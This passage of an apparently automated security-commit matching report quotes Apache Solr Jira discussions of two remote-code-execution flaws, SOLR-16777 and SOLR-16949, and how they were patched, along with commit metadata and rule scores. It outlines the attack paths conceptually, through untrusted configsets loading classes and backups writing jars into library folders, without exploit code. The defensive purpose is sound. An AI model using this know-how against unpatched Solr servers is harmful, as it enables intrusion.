                "SOLR-16777": "When configset API is used to upload configsets by unauthenticated users, a \"trusted: false\" flag is set on the configset. Such configsets cannot use the <lib> directive to load classes while creating/loading collections. Details here: https://solr.apache.org/guide/8_10/configsets-api.html#configsets-upload Unfortunately, this safety mechanism was bypassed in the schema designer when a isConfigsetTrusted was hardcoded to true. https://github.com/apache/solr/blob/branch_9_1/solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerConfigSetHelper.java#L697 As per Skay's report https://twitter.com/Skay_00/status/1646870062601756672 remote code execution is possible in unsecured Solr clusters where authentication hasn't been enabled. This ticket is to mitigate one aspect of that, i.e. the schema designer vulnerability. While our recommendation to all users remains the same, i.e. to secure Solr installations with authentication and authorization, I thank Skay for his detailed report. Schema Designer blindly \"trusts\" potentially malicious configset Attaching a patch to fix this. All tests pass. I'm planning to commit this soon, would love to have someone review it. LGTM. go ahead and merge please Commit bf9ca1044b2eec234038c2c27ec7996d589bb8c8 in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=bf9ca1044b2 ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets Commit 17b32f9b59094cda22e9e43236c97a575a7e16a0 in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=17b32f9b590 ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets Commit 0333862ad289d9f73c7c96e1d26ebe15e506a4aa in solr's branch refs/heads/branch_9_2 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=0333862ad28 ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets Thanks Skay, for reporting the bug as well as pointing towards the area of code containing the bug in your blog post! I have a question about the patch. Does this mean that everything the schema designer can never trust anything, even if it was uploaded by a trusted user? gus True. All unsafe features are disabled for any config that is uploaded over an API call Does this mean that everything the schema designer can never trust anything, even if it was uploaded by a trusted user? Yes. That is against the documentation for the trusted config set feature. I think the code should be determining if the user is trusted and then passing the correct value. Either one every time is wrong. The behavior should match config set upload. It's terribly confusing if nobody (trusted or untrusted) can use schema designer just because someone (trusted) uploaded a config set that requires trust previously... Because if the existing config that is being edited has \"trust required\" features\u00a0 and the user is editing something benign and unrelated to the \"trust required\" feature, this call will fail (unless I misunderstand) I think the code should be determining if the user is trusted and then passing the correct value. Sure, please feel free to re-open and add the check here. I hope all of this will become a non-issue once <lib> directives are gone ( SOLR-16781 ). Commit 9a4f4fff1cca1590eb039b521fb3f10abbdb62b3 in solr's branch refs/heads/branch_9_2 from Jan H\u00f8ydahl [ https://gitbox.apache.org/repos/asf?p=solr.git;h=9a4f4fff1cc ] SOLR-16777 Move changes entry from 9.2.1 to 9.2.2 Signed-off-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> https://solr.apache.org/guide/solr/latest/configuration-guide/configsets-api.html#configsets-upload specifies two other features that also are only available with trusted configsets. <lib> is not the only issue. So unless the whole trusted config set feature is going away hard-coding a value seems to create a trap for the user. I don't have time to work on this right now, but I'm -1 on anything that makes schema designer (or any other feature) fail for unclear reasons. If the error message is clear enough, and the ref guide is updated to clarify the incompatibility of the listed \"trusted\" features with schema designer and we commit to doing something nicer in 9.3 I'll change that to -0.9, but it would be much better to be consistent with the existing feature. Security is important,\u00a0 but we shouldn't make our software trappy and hard to use either. security is not optional . Unsafe features should be removed as and when we find them I don't think this makes schema designer unusable at all. This is an extremely obscure feature that's carried forward from non cloud Solr Of course it's not optional, but usability isn't optional either. The fact that security is more important is why I am willing to put up with a well documented gotcha for the short term. Which feature are you referring to as carried forward. Schema designer appeared in 8.10 and trusted configsets first showed up\u00a0 in 8.4? (in documentation at least, I haven't figured out if trusted configsets were undocumented for a while before that) <lib> and other unsafe features mentioned in the configset upload API will generate an error (with the reason) when loaded from untrusted configsets. Those features shouldn't be used anyway, so if they dont work with schema designer, it is not the end of the world. Which feature are you referring to as carried forward I guess he's referring to <lib> and other insecure features (stateless script update processor?) etc. Also, the overlap of users using such obscure and advanced features and those using the schema designer will probably be negligible. Re-opening to make sure either Document in ref-guide that Schema Designer now can ONLY work on untrusted config sets OR Toggle safe/unsafe based on whether the call is authorized, like is done for configset-api +1 to what Gus said, and Jan's decision to reopen. Sure, please feel free to re-open and add the check here. Procedurally, responding to review this way feels...maybe not \"wrong\", but at least \"odd\".  And maybe even slightly harmful? Obviously I'm not saying every last review comment needs addressed.  Some are too minor or loosely held even by the reviewer.  Often there's competing views, or a suggestion might deserve its own spinoff ticket, etc.  That stuff happens all the time. But to seemingly agree after a few back-and-forth's (or at least acquiesce?) and still not incorporate the feedback - with no explanation - just feels a little weird.  It discounts the time Gus and others put in to their reviews.  And, longer term, it'd be natural for anyone reading here to hesitate before giving you a review the next time around.  Which, it goes without saying, hurts everyone. ichattopadhyaya could you please at least explain why you don't care to incorporate Gus' feedback? Jason, please stop being so melodramatic. I'm on travel at the moment. I'll pick it up when I get some time. This is a volunteer driven project, so feel free to do something you expect me to do (which I will do). Btw, I agree with Jan's suggestion. I think we should rather add the check than explain why we don't. Fyi, Jason \ud83d\ude0a I think we should rather add the check than explain why we don't. +1 Jason, please stop being so melodramatic. I'm on travel at the moment Apologies for the \"melodrama,\" if that's how my comment came off.  I wasn't trying to make a bigger thing of it than it is. I've been thinking a lot lately about how it's the unwritten rules and norms that allow our community to work at all.  How we incorporate feedback is one of those.  Those norms are just so, so important.  That's all I was trying to get across. (And related - I think you're right - as important as it is, it's hard to elucidate or appeal to that sort of stuff without sounding like a crazy person catastrophizing or being melodramatic with some minuscule detail \ud83d\ude2c. So, I get that haha.) Anyways, I appreciate your clarifying that you intended to get to it in time .  That's perfect. Have a safe trip! Any conclusion on this? It currently blocks 9.2.2 I'll take a look at this, latest by Thursday this week; Hopefully, that will be before the 9.3 release. I added a patch that should use the built-in trustedness of the configSet being used, when designing with the schema designer. If the user uploads a custom file to the configSet using the schema designer APIs, it can only remove the trust (if the user is not authenticated). It can never add trust to an untrusted configSet, because there is no way to replace all files using the schema designer APIs. (And we aren't going to give a whole configSet trust just because one file is now \"trusted\") I'm trying to get a release candidate out soon, so would appreciate anyone that could review the patch! The patch LGTM, with the small quibble that maybe we should document the \"final\" behavior around Schema Designer and trusted-ness in the ref-guide somewhere? LGTM. Summarized changes: ZkConfigSetService.java: The method signature of loadConfigSetFlags was modified to remove the CoreDescriptor parameter. ConfigSetService.java: Import of ZkSolrResourceLoader was removed. Two methods, isConfigSetTrusted(String name) and isConfigSetTrusted(SolrResourceLoader coreLoader), were added to check whether a given config set or a config set associated with a resource loader is trusted. In the loadConfigSet method, the check for a trusted config set was replaced with a call to the new isConfigSetTrusted method. The createSolrConfig method was updated to use the isConfigSetTrusted method for the trusted argument. The loadConfigSetFlags method was modified, similar to the change in ZkConfigSetService.java, to remove the CoreDescriptor parameter. ConfigSetAPIBase.java: The isTrusted method was made static, and its visibility was changed to public. The isCurrentlyTrusted method was removed. The method ensureOverwritingUntrustedConfigSet was updated to use configSetService.isConfigSetTrusted(configName) instead of isCurrentlyTrusted(configName). CreateConfigSetAPI.java: Updated to use configSetService.isConfigSetTrusted(createConfigPayload.baseConfigSet) instead of isCurrentlyTrusted(createConfigPayload.baseConfigSet). UploadConfigSetAPI.java: Updated to use configSetService.isConfigSetTrusted(configSetName) instead of isCurrentlyTrusted(configSetName). SchemaDesignerAPI.java: Updated to use the static isTrusted method from ConfigSetAPIBase.java. Also added logic to remove the trusted flag on the configSet if the request is untrusted. SchemaDesignerConfigSetHelper.java: Updated to load the Solr config with the trusted flag retrieved from isConfigSetTrusted. Added isConfigSetTrusted and removeConfigSetTrust methods. Trust is now determined based on the config set itself rather than on the loading process, and checks for trust have been centralized in the ConfigSetService class. Thank you very much, houston , for getting to this! I skimmed through the changes (still too busy to find time for a thorough review), and they look reasonable. Ok I cleaned it up a bit more and added docs. Will commit soon, after the tests pass. So we are going to need an 8.11.2 release for this, correct? I can volunteer for an 8x release containing this, immediately after 9.3 is out. Thanks Houston! Commit 35d352522df046aab9035d60806ababffa0f00e8 in solr's branch refs/heads/main from Houston Putman [ https://gitbox.apache.org/repos/asf?p=solr.git;h=35d352522df ] SOLR-16777 : Make SchemaDesigner use ConfigSet trust Commit 6b6e45a7c6e4f08fe1db951164ddab93809459db in solr's branch refs/heads/branch_9x from Houston Putman [ https://gitbox.apache.org/repos/asf?p=solr.git;h=6b6e45a7c6e ] SOLR-16777 : Make SchemaDesigner use ConfigSet trust (cherry picked from commit 35d352522df046aab9035d60806ababffa0f00e8) Commit d07751cfaa8065bea8bd43f59e758e50d50c2419 in solr's branch refs/heads/branch_9_3 from Houston Putman [ https://gitbox.apache.org/repos/asf?p=solr.git;h=d07751cfaa8 ] SOLR-16777 : Make SchemaDesigner use ConfigSet trust (cherry picked from commit 35d352522df046aab9035d60806ababffa0f00e8) Closing after the 9.3.0 release Hi, was it fixed int he 8.11 line as well? No. I created backporting this as a blocker for 8.11.3: SOLR-16948 Commit 4ac1d59918c250bffb09899572bd92054cee063a in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=4ac1d59918c ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets The other fix here by Houston is still remaining. Working on it. houston , can you please review my changes to https://github.com/apache/lucene-solr/tree/jira/solr-16777-8x-backport branch? Patch file is here: https://github.com/apache/lucene-solr/commit/f9fdfc3863d436829e925acd2157e356205af929.diff I'm unable to raise a PR for it, GitHub shows me the following error: Pull request creation failed. Validation failed: must be a collaborator I wasn't able to port all the refactoring that the config sets codepaths has received in 9x, so doing a targeted fix here. That looks good, except that SchemaDesignerSettingsDAO.getSettings() is missing its change. Thanks for the quick review, Houston. Here's remaining change (another commit on the same branch): https://github.com/apache/lucene-solr/commit/a01567b6e5f49e9b9760c07d2c5db40e1255b150.diff +1 if everything passes Commit 6e9ed203b30958396bdfd41760d426b386646865 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=6e9ed203b30 ] SOLR-16777 : Schema Designer now correctly manages trust of the ConfigSets it is managing Co-authored-by: Houston Putman <houston@apache.org>"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [
                [
                    "no-tag",
                    "f9fdfc3863d436829e925acd2157e356205af929"
                ],
                [
                    "no-tag",
                    "a01567b6e5f49e9b9760c07d2c5db40e1255b150"
                ]
            ],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "COMMIT_IS_SECURITY_RELEVANT",
                    "message": "",
                    "relevance": 32
                },
                {
                    "id": "XREF_BUG",
                    "message": "The commit and the advisory (including referenced pages) mention the same bug tracking ticket: SOLR-16777",
                    "relevance": 32
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: ZooKeeper, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerAPI.java, solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerConfigSetHelper.java, solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerSettingsDAO.java, solr/core/src/java/org/apache/solr/handler/admin/ConfigSetsHandler.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16777 contains some security-related terms: unsafe, secure, security, insecure, malicious",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler",
                    "relevance": 4
                },
                {
                    "id": "COMMIT_HAS_TWINS",
                    "message": "This commit has one or more twins.",
                    "relevance": 2
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16777",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "6c8f24eb9e3fe1cb19058173f2e221de3febfeda",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1702888353,
            "hunks": 13,
            "message": "SOLR-16949: Fix inputstream leaks",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/util/FileTypeMagicUtil.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16949": "Before an 8.11.3 release, https://issues.apache.org/jira/browse/SOLR-16480 needs to be backported, thus creating this as a blocker. Here I am assuming that 8.x is vulnerable to the same attack, which should be investigated. RCE via Backup/Restore APIs - Fix for all file extensions See attached patch. It is not a back port of SOLR-16480 and is not for branch_8_11, but for main. It adds a file content MAGIC check for each location where we today call ZkMaintenanceUtils.isFileForbiddenInConfigSets() . I.e. it will peek inside each file and use \"libmagic\" style detection based on a config file in resources/magic folder. There exists thousands of matching rules for all kid of file formats (see https://github.com/file/file/tree/master/magic/Magdir ), but I copied rules for ZIP, TAR and CLASS, and made a simple regex rule for shell scripts. As an alternative to using the https://github.com/j256/simplemagic library (which is not super well maintained) would be to write our own detection rules in Java, which would not be too hard for JAR and CLASS which are the most important. This is definitely not a requirement for the change, but we should get rid of the file type extension stuff that I added in. Otherwise that looks like a really good patch, thanks for the awesome work here Jan! So we now have three options for safeguarding 8.11.3 against this attack: This patch (replacing filename suffix solution). It is way safer and I cannot think of a way an attacker could circumvent it, other than crafting a .jar or .class file that we cannot detect SOLR-16781 to feature toggle <lib> directives (keep old behavior by default) https://github.com/apache/solr/pull/2068 to feature toggle BACKUP to local file system (keep disabled by default) If we choose 1 we may not urgently need 2 or 3. But we may want to proceed with 2 for other reasons later. If we choose 2, we don't plug the hole by defualt but will need to document a recommendation to disable. If we choose 3 it will be a breaking change for users of BACKUP feature that needs to be documented. I choose Option 1 for all 8.11, 9.x, main Option 2 for 9.x, and remove <lib> in 10 If anyone wants to expedite this, feel free to grab this. I won't be able to continue until mid next week. > we should get rid of the file type extension stuff that I added in. Formally that cannot be removed until 10.0. We could document the deprecation of the extension feature together with this patch, and open a new Jira to remove the code in main. I won't be able to continue until mid next week. Would you be able to get to this soon? If so, I'll wait for you to get it in and then spin RC2. I can give backporting an attempt... Uploaded a patch for branch_8_11 SOLR-16949-8_11.patch It is based on the other patch, but with tweaks to make it fit the older codebase. As a workarodnd for the fact that the new FileTypeMagicUtil is in core and not in solrj, and therefore cannot be used by ZkMaintenanceUtils where we have methods like uploadToZK() and zkTransfer(), I added a check in SolrCLI before uploading a configset with either solr zk upconfig or solr create -c foo -d folder/. It is not perfect, but I did not want to introduce a new jar dependency to solrj, and I did not fancy writing the detectors myself. ichattopadhyaya please take it for a spin if you like. So with this we fail fast if the configSet contains a sh, zip, jar, tar or class file When uploading configset with bin/solr When uploading configset through configset API When doing backup of a collection (skip file and warn, not abort) When restoring a configset from a backup into zookeeper (skip file and warn, not abort) The patch contains some tests but not extensive integration tests here. I have run the entire test suite with ant. No refguide or CHANGES so far. When reviewing, pay special attention to Do we detect enough file tyes? Is the detection for each (especially jar) robust or can it be gamed? Should the backup/restore fail instead of just skip file and warn when an illegal file is detected? Try to customize solr.configset.upload.mimetypes.forbidden sysprop Based on review feedback I may help to refine a time or two before commit. Or feel free to revise the patch at your liking. When the 8.x patch is solid, we can update the main-branch patch with the latest changes. As a workarodnd for the fact that the new FileTypeMagicUtil is in core and not in solrj, and therefore cannot be used by ZkMaintenanceUtils where we have methods like uploadToZK() and zkTransfer(), I added a check in SolrCLI before uploading a configset with either solr zk upconfig or solr create -c foo -d folder/. It is not perfect, but I did not want to introduce a new jar dependency to solrj, and I did not fancy writing the detectors myself. This also requires direct access to ZooKeeper, so I'm not nearly as concerned. We can really only control the Solr ConfigSets API as well as any downloading of Zookeeper data to disk (Backups) Do we detect enough file tyes? Is the detection for each (especially jar) robust or can it be gamed? Maybe it would be helpful to add a second level of security here. Most of the places that would be dangerous to allow jars/class files to be backed up to are \"lib/\" directories. (/solr/lib, /solr/modules/<>/lib, /solr-home/lib, /solr-core/lib, etc) We could basically forbid saving anything to a \"lib\" folder, or to a known classloader folder (like shared-lib). Maybe it would be helpful to add a second level of security here. Most of the places that would be dangerous to allow jars/class files to be backed up to are \"lib/\" directories. (/solr/lib, /solr/modules/<>/lib, /solr-home/lib, /solr-core/lib, etc) We could basically forbid saving anything to a \"lib\" folder, or to a known classloader folder (like shared-lib). Ok I went ahead and tried this out, adding it as SOLR-16949 -main-protect-lib.patch This is independent of the other patch, but ultimately I think both should be merged. Thoughts? Thanks for review Houston. The protected lib technique is orthogonal and would definitely add another layer. Should that patch perhaps ripple down from main -> 9x -> 9.4.1 -> 8.11.3, or do\u00a0 you want to land it in 8.11.3 first? We urgently want to get 8.11.3 and 9.4.1 out the door, so I think it needs to land both places anyway. Thanks for agreeing Jan. If you have time to review, I'll make it ready for commit and then do the regular main -> 9x -> 9.4.1 -> 8.11.3 workflow. The protected path feature can be added in the open, right, as it does not reveal any undisclosed CVE to anyone, it is just an additional hardening against potential future undiscovered attacks. I'll try to review PRs. Hmm I guess, its a different way of solving the same vulnerability, so I'm not sure it can be done openly. Happy to make a public JIRA/PR if y'all think its ok. Added more tests, and fixed something that the tests found. It should be close to ready I think. I'm trying to get up to speed on what's happening here and I'm confused. \u00a0If the problem relates to being able to tell Solr to backup stuff to locations that shouldn't be (i.e. to places inside Solr), can't we have a simple allowList approach? \u00a0Maybe the parent issue SOLR-16480 is what matters and not this backport one? \u00a0I see my \"slippery slope\" comment there and it really still resonates me... we are going down a slippery slope alright. I'd appreciate it if you would expand on \"slippery slope\" when you use that phrase. I don't think having a list of \"protected paths\" that don't allow writes is anything crazy. I also think limiting the file types that we allow in configSets is perfectly acceptable. I have no issue with also adding an \"allowList\" for backups. The big difference being that this is back-compat for good-faith users for 9x and 8.11, whereas allowList wouldn't be. The slippery slope is a cat & mouse game with someone who observes these... what I consider band-aids, and sees something we missed, and this continues. \u00a0If we protect certain paths but forget one, is that then CVE worthy? \u00a0I'd argue instead that we should require the installer user, the one who can configure solr.xml & startup, to choose the allowList paths that are okay. \u00a0A similar mindset for file extensions if we want to block based on them. RE back-combat; IMO it's reasonable to require that an upgrading user further specify certain startup/solr.xml options that didn't exist before, in the name of security. \u00a0Perhaps some good defaults could mean no action is necessary for some users. \u00a0Maybe \"/var\" is pre-approved. \u00a0Maybe furthermore we shouldn't load libs from a \"/var\" path unless the configuration is explicit about using such a path. \u00a0Just brainstorming a bit. I don't think it hurts to add multiple layers of security. However, the root cause of this issue is that it is even allowed to define a file-system backup outside of the \"location\" that is defined in solr.xml as the backup repository location, see https://solr.apache.org/guide/solr/latest/deployment-guide/backup-restore.html#localfilesystemrepository What if we modified the LocalFileSystemRepository to restrict the backup location to be within the statically configured location? Then attackers whould need to figure out how to add that admin-decided location to classpath, or to create a core inside that location. Or something else. <backup> <repository name= \"local_repo\" class= \"org.apache.solr.core.backup.repository.LocalFileSystemRepository\" > <str name= \"location\" > /solr/backup_data </str> </repository> </backup> If we protect certain paths but forget one, is that then CVE worthy? With two layers of protection, I think we'd be pretty safe from having to issue another CVE, but obviously there is always the possibility. I'd argue instead that we should require the installer user, the one who can configure solr.xml & startup, to choose the allowList paths that are okay. The \"allowBackupPath\" you suggest is really close to the \"allowPaths\" logic we already have, however it really just adds \"SOLR_HOME\", \"SOLR_DATA_HOME\" and \"coreRootDirectory\". \"SOLR_DATA_HOME\" is fine, no libraries are loaded from there. \"SOLR_HOME\" has \"SOLR_HOME/lib\" and \"coreRootDirectory\" has \"coreRootDirectory/lib\". Lastly, \"sharedLib\" might be included under \"allowPaths\", so we can forbid that just for the sake of being cautious. The other logic in the protections merely exist to be extra cautious. Basically this is one less configuration a user needs to care about, but adds extra checks to make sure they can't shoot themselves in the foot. (e.g. even if the \"allowBackupPath\" option existed, they could set it to a folder that included their SOLR_HOME, which would make them vulnerable) That's basically what this PR is, although extra protected paths have been added just to be extra cautious RE back-combat; IMO it's reasonable to require that an upgrading user further specify certain startup/solr.xml options that didn't exist before, in the name of security. I agree for a minor version, but this would be a fairly big change for users in a patch change, especially when there are options that aren't back-compat breaking. Users using an \"8.11\" docker image, to auto-receive security updates, would see their backups start failing automatically. Perhaps some good defaults could mean no action is necessary for some users. \u00a0Maybe \"/var\" is pre-approved. I don't like the ideas of defaults when Solr has no guidelines for how a filesystem should be setup. Using \"/var\" as a default wouldn't work because the SOLR_HOME/lib and SOLR_CORE/lib could easily be under \"/var\", like they are in the Docker image. Looks good Jan. And maybe the \"slipper slope\" metaphor isn't the right metaphor Jan, I think making the location required going forward is a good idea. And all paths provided in the API would need to be relative to that location (without \"../\"). But I think for 8.11 at least (and probably 9.4.1), we would need to protect without making \"location\" mandatory. (As I've mentioned before). Did some basic cleanup of the 8.11 patch, added some javadoc, when traversing folders, skip only \".\" and \"..\", not every folder starting with a \".\". Ran \"ant precommit\". Do you have a suggestion for CHANGES.txt entry and JIRA number to use? Looks good to me Jan. I would use this JIRA. And something simple like \"Restrict certain file types from being uploaded with or downloaded from Config Sets.\" Pushed to branch_8_11 in https://github.com/apache/lucene-solr/commit/7e9a2e67f812032a049836c3aa0b18bf5cd717f9 I have updated the patch for main branch with latest updates from 8.11 patch: SOLR-16949.patch Precommit passes and I am ready to merge. Do we want to avoid the extra publicity that a PR gives, by pushing directly from the command line? If so, I'm grateful for a patch review of the updated patch. Note: I kept the patch from SOLR-16480 intact, but we could do another JIRA to remove that filename-suffix feature from main branch after this has landed. That patch for main looks good to me Jan, I would push directly to main (and backport of course) without PRs. As for SOLR-16480 , I do think we should have a Jira to remove that in main, after this has landed. main: https://github.com/apache/solr/commit/15534754f492079e52288dd11abaf1c4261b3ea4 branch_9x: https://github.com/apache/solr/commit/644dd3a6d6780d71030f7070754d2f3adce22859 branch_9_4: https://github.com/apache/solr/commit/ad6854b04361e351e08aa8f39fb7ff0e8fedc9a2 There's some local (and Jenkins) test failures that look related to this change, particularly in TestConfigSetService and TestFileSystemConfigSetService. See this Jenkins build for an example.  (I've also attached the Jenkins logs, so they're preserved after our build-retention rolls over.) jenkins.log.txt.gz At a glance it looks like the problem is that this change introduces some InputStream leaks ] in our ConfigSet code.  Seems like a simple-ish fix?  I suspect one of you guys might already be aware of this and working on a fix, and I don't want to duplicate effort.  But if you aren't already on it, lmk and I can toss a fix together. Yea, looks like some careless stream handling there. Taking a look. Fix in SOLR-16949-inputstream-leaks.patch . This patch passes Path objects instead of InputStream and also uses the File and byte[] methods of SimpleMagic library instead of always converting to InputStream. Also streamlines tests with try-with-resources. I ran the entire test suite locally, so committed right away: main: https://github.com/apache/solr/commit/c89813a675663bb82f18236840b2a84cac05e1ee branch_9x: https://github.com/apache/solr/commit/c79011e81dada2f9bc4b4df32ffb32152ef81152 branch_9_4: https://github.com/apache/solr/commit/ce2813c97f70b5e83ece80455aad74a1fd7eeca6 A belated LGTM on the resource-leak fix; thanks Jan! Yep, looks good. Doesn't look like branch_8_11 code is directly using the same code, except some tests that may be leaking streams. I'll have a look at pushing a patch to that branch too. Backport of inputstream handling to branch_8_11: https://github.com/apache/lucene-solr/commit/6c8f24eb9e3fe1cb19058173f2e221de3febfeda Closing after the 9.4.1 release"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "COMMIT_IS_SECURITY_RELEVANT",
                    "message": "",
                    "relevance": 32
                },
                {
                    "id": "XREF_BUG",
                    "message": "The commit and the advisory (including referenced pages) mention the same bug tracking ticket: SOLR-16949",
                    "relevance": 32
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/util/FileTypeMagicUtil.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16949 contains some security-related terms: hardening, security, vulnerable, rce",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: stream",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16949",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "7e9a2e67f812032a049836c3aa0b18bf5cd717f9",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1702461407,
            "hunks": 16,
            "message": "SOLR-16949: Restrict certain file types from being uploaded to or downloaded from Config Sets",
            "changed_files": [
                "lucene/ivy-versions.properties",
                "solr/core/ivy.xml",
                "solr/core/src/java/org/apache/solr/core/backup/BackupManager.java",
                "solr/core/src/java/org/apache/solr/handler/admin/ConfigSetsHandler.java",
                "solr/core/src/java/org/apache/solr/util/FileTypeMagicUtil.java",
                "solr/core/src/java/org/apache/solr/util/SolrCLI.java",
                "solr/core/src/resources/magic/executables",
                "solr/core/src/test-files/magic/HelloWorldJavaClass.class.bin",
                "solr/core/src/test-files/magic/hello.tar.bin",
                "solr/licenses/simplemagic-1.17.jar.sha1",
                "solr/solrj/src/java/org/apache/solr/common/cloud/ZkMaintenanceUtils.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16949": "Before an 8.11.3 release, https://issues.apache.org/jira/browse/SOLR-16480 needs to be backported, thus creating this as a blocker. Here I am assuming that 8.x is vulnerable to the same attack, which should be investigated. RCE via Backup/Restore APIs - Fix for all file extensions See attached patch. It is not a back port of SOLR-16480 and is not for branch_8_11, but for main. It adds a file content MAGIC check for each location where we today call ZkMaintenanceUtils.isFileForbiddenInConfigSets() . I.e. it will peek inside each file and use \"libmagic\" style detection based on a config file in resources/magic folder. There exists thousands of matching rules for all kid of file formats (see https://github.com/file/file/tree/master/magic/Magdir ), but I copied rules for ZIP, TAR and CLASS, and made a simple regex rule for shell scripts. As an alternative to using the https://github.com/j256/simplemagic library (which is not super well maintained) would be to write our own detection rules in Java, which would not be too hard for JAR and CLASS which are the most important. This is definitely not a requirement for the change, but we should get rid of the file type extension stuff that I added in. Otherwise that looks like a really good patch, thanks for the awesome work here Jan! So we now have three options for safeguarding 8.11.3 against this attack: This patch (replacing filename suffix solution). It is way safer and I cannot think of a way an attacker could circumvent it, other than crafting a .jar or .class file that we cannot detect SOLR-16781 to feature toggle <lib> directives (keep old behavior by default) https://github.com/apache/solr/pull/2068 to feature toggle BACKUP to local file system (keep disabled by default) If we choose 1 we may not urgently need 2 or 3. But we may want to proceed with 2 for other reasons later. If we choose 2, we don't plug the hole by defualt but will need to document a recommendation to disable. If we choose 3 it will be a breaking change for users of BACKUP feature that needs to be documented. I choose Option 1 for all 8.11, 9.x, main Option 2 for 9.x, and remove <lib> in 10 If anyone wants to expedite this, feel free to grab this. I won't be able to continue until mid next week. > we should get rid of the file type extension stuff that I added in. Formally that cannot be removed until 10.0. We could document the deprecation of the extension feature together with this patch, and open a new Jira to remove the code in main. I won't be able to continue until mid next week. Would you be able to get to this soon? If so, I'll wait for you to get it in and then spin RC2. I can give backporting an attempt... Uploaded a patch for branch_8_11 SOLR-16949-8_11.patch It is based on the other patch, but with tweaks to make it fit the older codebase. As a workarodnd for the fact that the new FileTypeMagicUtil is in core and not in solrj, and therefore cannot be used by ZkMaintenanceUtils where we have methods like uploadToZK() and zkTransfer(), I added a check in SolrCLI before uploading a configset with either solr zk upconfig or solr create -c foo -d folder/. It is not perfect, but I did not want to introduce a new jar dependency to solrj, and I did not fancy writing the detectors myself. ichattopadhyaya please take it for a spin if you like. So with this we fail fast if the configSet contains a sh, zip, jar, tar or class file When uploading configset with bin/solr When uploading configset through configset API When doing backup of a collection (skip file and warn, not abort) When restoring a configset from a backup into zookeeper (skip file and warn, not abort) The patch contains some tests but not extensive integration tests here. I have run the entire test suite with ant. No refguide or CHANGES so far. When reviewing, pay special attention to Do we detect enough file tyes? Is the detection for each (especially jar) robust or can it be gamed? Should the backup/restore fail instead of just skip file and warn when an illegal file is detected? Try to customize solr.configset.upload.mimetypes.forbidden sysprop Based on review feedback I may help to refine a time or two before commit. Or feel free to revise the patch at your liking. When the 8.x patch is solid, we can update the main-branch patch with the latest changes. As a workarodnd for the fact that the new FileTypeMagicUtil is in core and not in solrj, and therefore cannot be used by ZkMaintenanceUtils where we have methods like uploadToZK() and zkTransfer(), I added a check in SolrCLI before uploading a configset with either solr zk upconfig or solr create -c foo -d folder/. It is not perfect, but I did not want to introduce a new jar dependency to solrj, and I did not fancy writing the detectors myself. This also requires direct access to ZooKeeper, so I'm not nearly as concerned. We can really only control the Solr ConfigSets API as well as any downloading of Zookeeper data to disk (Backups) Do we detect enough file tyes? Is the detection for each (especially jar) robust or can it be gamed? Maybe it would be helpful to add a second level of security here. Most of the places that would be dangerous to allow jars/class files to be backed up to are \"lib/\" directories. (/solr/lib, /solr/modules/<>/lib, /solr-home/lib, /solr-core/lib, etc) We could basically forbid saving anything to a \"lib\" folder, or to a known classloader folder (like shared-lib). Maybe it would be helpful to add a second level of security here. Most of the places that would be dangerous to allow jars/class files to be backed up to are \"lib/\" directories. (/solr/lib, /solr/modules/<>/lib, /solr-home/lib, /solr-core/lib, etc) We could basically forbid saving anything to a \"lib\" folder, or to a known classloader folder (like shared-lib). Ok I went ahead and tried this out, adding it as SOLR-16949 -main-protect-lib.patch This is independent of the other patch, but ultimately I think both should be merged. Thoughts? Thanks for review Houston. The protected lib technique is orthogonal and would definitely add another layer. Should that patch perhaps ripple down from main -> 9x -> 9.4.1 -> 8.11.3, or do\u00a0 you want to land it in 8.11.3 first? We urgently want to get 8.11.3 and 9.4.1 out the 